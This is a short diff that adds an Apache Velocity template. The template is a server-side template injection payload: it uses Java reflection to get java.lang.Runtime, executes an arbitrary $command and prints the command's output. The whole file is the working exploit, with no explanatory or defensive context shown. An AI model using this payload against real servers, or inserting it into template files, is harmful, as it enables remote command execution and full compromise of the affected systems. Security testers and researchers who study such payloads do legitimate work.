@@ -1,0 +1,9 @@
+#set($exp="exp")
+#set($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))
+#set($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
+#set($sc = $exp.getClass().forName("java.util.Scanner"))
+#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))
+#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
+#if($scan.hasNext())
+    $scan.next()
+#end
